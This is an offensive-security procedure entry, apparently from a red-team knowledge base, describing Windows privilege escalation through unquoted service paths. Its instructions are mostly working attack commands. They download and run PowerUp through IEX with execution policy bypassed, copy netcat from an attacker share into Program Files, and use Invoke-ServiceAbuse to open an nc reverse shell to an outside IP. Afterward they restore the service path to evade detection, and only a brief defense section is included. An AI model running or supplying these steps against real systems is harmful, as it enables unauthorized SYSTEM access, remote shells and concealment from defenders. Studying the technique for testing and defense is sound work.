---
id: b2e28553-4e42-4f8b-ab66-786d317644d4
name: Windows-Privilege-Escalation-Unquoted-Service-Paths
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.688574+00:00'
updated_at: '2023-04-10T20:37:34.110238+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - >-
    [[techniques/Create-or-Modify-System-Process-Windows-Service|T1543.003 -
    Create or Modify System Process: Windows Service]]
sub_techniques: []
tags:
  - '[[tags/EoP - Unquoted Service Paths]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/powershell-invoke-powerup-allchecks]]'
  - '[[commands/powershell-invoke-serviceabuse]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerUp]]'
validated: true
---

# Windows-Privilege-Escalation-Unquoted-Service-Paths

## Summary

This procedure exploits unquoted service path vulnerabilities on Windows systems to escalate privileges from a low-privileged user to SYSTEM. It uses the PowerUp PowerShell script to identify vulnerable services where the executable path lacks quotation marks, allowing directory traversal to execute malicious code, and then abuses the service to run arbitrary commands with elevated privileges.

## Description

Unquoted service paths occur when Windows services are configured with paths that are not enclosed in double quotes, such as 'C:\Program Files\Vendor\Product\Service.exe' instead of '"C:\Program Files\Vendor\Product\Service.exe"'. When the service starts, Windows parses the path from left to right, attempting to execute files in intermediate unquoted directories if they exist. An attacker with write access to an intermediate directory (e.g., C:\Program Files\) can place a malicious executable named to match the next segment (e.g., 'Vendor.exe'), causing the service to run it instead. This procedure targets such misconfigurations to achieve privilege escalation, commonly found in legacy or poorly installed software. It requires initial low-privileged shell access and assumes PowerShell execution is not blocked by AppLocker or similar controls. Successful exploitation grants SYSTEM-level code execution, enabling persistence, data exfiltration, or further lateral movement.

## Requirements

1. Low-privileged user access (e.g., standard user shell) on a Windows target (Windows 7+).
2. Network access to download PowerUp.ps1 (or local copy) and any payload (e.g., netcat or reverse shell script).
3. Write permissions to an intermediate directory in the vulnerable service path (e.g., C:\Program Files\).
4. PowerShell execution policy allowing script execution (bypassed via -exec bypass).

## Defense

- Enclose all service binary paths in double quotes during installation and configuration.
- Regularly audit services using tools like PowerUp or sc.exe to identify unquoted paths: `sc qc <ServiceName>`.
- Implement application whitelisting (e.g., AppLocker, WDAC) to prevent execution of unauthorized binaries in system directories.
- Monitor service modifications via Windows Event Logs (Event ID 7045 for new services, 4697 for modifications) and file creation in sensitive paths.

## Objectives

1. Identify vulnerable unquoted service paths on the target system.
2. Modify or hijack a vulnerable service to execute arbitrary code as SYSTEM.
3. Establish a reverse shell or persistent access with elevated privileges.

## Instructions

### Step 1: Identify Unquoted Service Paths

**Context**: Download and execute the PowerUp script to perform comprehensive privilege escalation checks, focusing on unquoted service paths. This step enumerates all services and flags those with unquoted paths, providing the service name, path, and potential abuse functions.

**Command** ([[commands/powershell-invoke-powerup-allchecks]]):
```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

> This command bypasses execution policy, downloads PowerUp from its GitHub repository, and runs all checks. Look for the 'Checking for unquoted service paths' section in the output to identify vulnerable services. If no internet access, host PowerUp.ps1 locally and use `IEX (Get-Content PowerUp.ps1)` instead.

### Step 2: Prepare and Place Malicious Payload

**Context**: Based on the vulnerable path identified (e.g., C:\Program Files\Vendor\Product\Service.exe), determine the hijack point (e.g., create 'Vendor.exe' in C:\Program Files\). Upload or create a malicious executable (e.g., netcat.exe renamed to match) that establishes a reverse connection. Ensure the payload is staged in a writable location like %TEMP% first, then move it to the target directory.

**Command** (using built-in PowerShell for file operations):
```powershell
Copy-Item \\attacker\share\nc.exe "C:\Program Files\Vendor.exe"
```

> Replace paths as needed. Verify placement with `dir "C:\Program Files\"`. The payload should execute a reverse shell command like `nc.exe attacker_ip 4444 -e cmd.exe` when run.

### Step 3: Abuse the Vulnerable Service

**Context**: With PowerUp loaded in the current PowerShell session (from Step 1), use Invoke-ServiceAbuse to modify the service's binary path to point to your malicious executable. This causes the service to execute the payload on next restart or start. Restart the service immediately to trigger execution.

**Command** ([[commands/powershell-invoke-serviceabuse]]):
```powershell
Invoke-ServiceAbuse -Name 'BBSvc' -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

> Replace 'BBSvc' with the actual service name from Step 1 output. The -Command parameter specifies the payload execution (adjust path/IP/port). After running, start the service with `sc start BBSvc` if not automatic. Expected: Reverse shell connection received on listener (e.g., nc -lvnp 4444).

### Step 4: Verify Escalation and Cleanup

**Context**: Confirm SYSTEM privileges in the new shell (e.g., `whoami /priv`). Optionally, restore the original service path to evade detection: `sc config BBSvc binPath= "C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe"` and restart.

**Command** (built-in):
```powershell
whoami /all
sc config <ServiceName> binPath= "Original Path"
sc start <ServiceName>
```

> Success if privileges include SeDebugPrivilege and full access. Monitor for alerts on service changes.
